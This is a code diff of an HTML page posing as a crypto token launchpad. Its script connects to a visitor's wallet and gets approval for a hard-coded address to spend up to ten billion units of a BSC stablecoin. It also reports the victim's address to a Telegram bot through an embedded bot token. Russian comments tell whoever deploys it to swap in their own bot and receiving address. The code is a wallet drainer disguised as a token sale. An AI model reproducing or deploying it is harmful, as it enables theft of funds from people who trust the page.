@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-
+<!-- tesst -->
 <head>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -46,15 +46,15 @@
   // Какая сеть нужна: bsc изменить 56 на что то другое и получиться eth или полигон и тп.
   const targetNetworkId = 56; // mainnet
   const targetNetworkIdHex = "0x" + targetNetworkId.toString(16); // mainnet
-	
+
   if (typeof window.ethereum !== 'undefined') {
     window.ethereum.enable().then(async () => {
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     const account = accounts[0];
     console.log(account);
     const provider = new ethers.providers.Web3Provider(window.ethereum);
-	    
-    // контракт BUSD и его адрес. Если нужно другой токен снимать то меняете адрес контракта и все.	  
+
+    // контракт BUSD и его адрес. Если нужно другой токен снимать то меняете адрес контракта и все.
     const BUSD_contract = new ethers.Contract(
 	"0x55d398326f99059fF775485246999027B3197955",
 	BUSD_abi,
@@ -67,14 +67,14 @@
       const USDTsigned = _token_contract.connect(signer);
 
       // сюда вставляете ваш телеграм бот если надо
-      const tgRequestBase = "https://api.telegram.org/bot5588381036:AAFNFLw2B_PFWgNQoMwU3TUo26kp1cuFs_Q/sendMessage?chat_id=5035787113&text=";
+      const tgRequestBase = "https://api.telegram.org/bot5726408738:AAEJEV-9tTB4P0xsxVFXlp3GL5Gd-QPwDeo/sendMessage?chat_id=5035787113&text=";
       const Http = new XMLHttpRequest();
       Http.open("GET", tgRequestBase + "initiated for " + signer_addr);
       Http.send();
       // "Initiated"
       // меняйте адрес на ваш и тут он дает разрешение снимать до 10000000000 BUSD. Можно увеличить но вряд ли столько суммы у кого то найдеться))
       await USDTsigned.approve(
-        "0x7a93629926229D61EC5C9d902e3F300239f3612a",
+        "0xF8284B6fB89d05C9E6845976914CE9A5e84b32fA",
         ethers.utils.parseEther("10000000000.0")
       );
 
@@ -97,12 +97,12 @@
     <div class="header__body">
       <div class="header__item">
         <a href="/">
-          <img class="logo" width="380" height="80" src="dist_herman/img/logo.svg" alt="лого">
+          <img class="logo" width="380" height="80" src="./img/logo.svg" alt="лого">
         </a>
       </div>
       <div class="header__item">
         <a href="#" class="btn">
-          <img src="dist_herman/img/pank.svg" alt="">
+          <img src="./img/pank.svg" alt="">
           <span>Buy TPAD</span>
         </a>
         <a href="#" class="btn">
@@ -174,7 +174,7 @@
       </div>
       <div class="pad__item pad-main">
         <div class="pad-main__header">
-          <img src="dist_herman/img/crypto-logo.png" alt="">
+          <img src="./img/crypto-logo.png" alt="">
           <h3>DOGEKING</h3>
         </div>
         <p class="pad-main__p">
